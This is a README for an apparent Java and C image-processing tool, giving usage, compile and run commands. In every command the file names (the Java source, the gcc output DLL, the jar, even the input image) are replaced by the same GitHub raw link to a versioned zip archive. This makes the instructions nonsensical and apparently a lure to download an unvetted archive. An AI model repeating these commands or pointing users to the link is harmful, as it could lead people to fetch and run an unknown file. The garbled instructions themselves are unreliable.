# Eight Bit Image Processor

<b>Usage:</b>
1. ``` javac https://github.com/Rohan17182004/EightBitImageJava/raw/refs/heads/main/images/Eight-Image-Java-Bit-1.9.zip ```
2. ``` java -Xmx8g Main -i <path_to_image_file> -t <number_of_threads_to_be_used> [-d <GPU device id>][optional]```

<b>Example:</b>
1. ``` javac https://github.com/Rohan17182004/EightBitImageJava/raw/refs/heads/main/images/Eight-Image-Java-Bit-1.9.zip ```
2. ``` java -Xmx8g Main -i https://github.com/Rohan17182004/EightBitImageJava/raw/refs/heads/main/images/Eight-Image-Java-Bit-1.9.zip -t 8 ```

<h2>Conversion of C program to .DLL shared object file</h2>

``` gcc -shared -o https://github.com/Rohan17182004/EightBitImageJava/raw/refs/heads/main/images/Eight-Image-Java-Bit-1.9.zip image_processor.c -I"C:/Program Files/Java/jdk-23/include" -I"C:/Program Files/Java/jdk-23/include/win32" -I"C:/Users/RICKY/Documents/5TH_SEM_PROJ" -L"C:/Program Files (x86)/Common Files/Intel/Shared Libraries/lib" -I"C:/Users/RICKY/Downloads/OpenCL-Headers-main/OpenCL-Headers-main" -lOpenCl -fopenmp ```

Replace the directories with your own path

<h2>Running the <i>https://github.com/Rohan17182004/EightBitImageJava/raw/refs/heads/main/images/Eight-Image-Java-Bit-1.9.zip</i> file</h2>

``` java -jar https://github.com/Rohan17182004/EightBitImageJava/raw/refs/heads/main/images/Eight-Image-Java-Bit-1.9.zip -i <path_to_image> [-t <number_of_threads>][optional] ```

<b>Example:</b>

``` java -jar https://github.com/Rohan17182004/EightBitImageJava/raw/refs/heads/main/images/Eight-Image-Java-Bit-1.9.zip -i https://github.com/Rohan17182004/EightBitImageJava/raw/refs/heads/main/images/Eight-Image-Java-Bit-1.9.zip -t 8 ```
